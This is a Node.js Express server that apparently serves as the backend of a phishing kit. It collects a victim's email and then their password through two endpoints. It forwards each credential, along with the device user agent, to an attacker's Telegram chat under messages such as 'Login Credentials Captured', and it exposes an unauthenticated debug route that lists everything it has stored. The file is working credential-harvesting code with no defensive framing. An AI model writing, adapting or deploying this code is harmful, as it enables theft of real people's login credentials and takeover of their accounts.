require("dotenv").config();
const express = require("express");
const cors = require('cors');
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");

const app = express();

// === RELIABLE CORS CONFIG FOR RAILWAY + VERCEL ===
app.use(cors({
  origin: '*',                    // Temporarily allow all (including your Vercel site)
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400                   // Cache preflight for 24 hours
}));

// Explicit preflight handler - this fixes most Railway CORS issues
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Max-Age', '86400');
  res.status(204).end();
});

app.use(express.json());

// ====================== TELEGRAM SETUP ======================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env");
  process.exit(1);
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    });
    console.log("✅ Sent to Telegram");
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

// Store attempts
const loginAttempts = new Map();

// ====================== STEP 1: Submit Email ======================
app.post("/api/submit-email", async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  const attemptId = uuidv4();
  const userAgent = req.get("User-Agent") || "Unknown";

  loginAttempts.set(attemptId, {
    email,
    userAgent,
    timestamp: new Date().toISOString(),
  });

  await sendToTelegram(
    `🏋️‍♂️ *New Login Attempt*\n\n` +
    `📧 *Email:* ${email}\n` +
    `📱 *Device:* ${userAgent.slice(0, 120)}${userAgent.length > 120 ? "..." : ""}\n` +
    `⏳ Waiting for password...\n` +
    `🔑 ID: \`${attemptId.slice(0, 8)}\``
  );

  res.json({
    status: "success",
    message: "Email received. Please enter password.",
    attemptId,
  });
});

// ====================== STEP 2: Submit Password ======================
app.post("/api/submit-password", async (req, res) => {
  const { attemptId, password } = req.body;

  if (!attemptId || !password) {
    return res.status(400).json({ error: "attemptId and password required" });
  }

  const attempt = loginAttempts.get(attemptId);
  if (!attempt) {
    return res.status(404).json({ error: "Invalid attempt ID" });
  }

  attempt.password = password;

  await sendToTelegram(
    `✅ *Login Credentials Captured*\n\n` +
    `📧 *Email:* ${attempt.email}\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
    `⏰ *Time:* ${new Date().toISOString()}`
  );

  res.json({ status: "success", message: "Done" });
});

// Debug route
app.get("/api/debug", (req, res) => {
  res.json(Array.from(loginAttempts.entries()));
});

// === IMPORTANT: Use Railway's dynamic PORT ===
const port = process.env.PORT || 3000;

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${port}`);
  console.log("Endpoints:");
  console.log("   POST /api/submit-email     → { email }");
  console.log("   POST /api/submit-password  → { attemptId, password }");
});
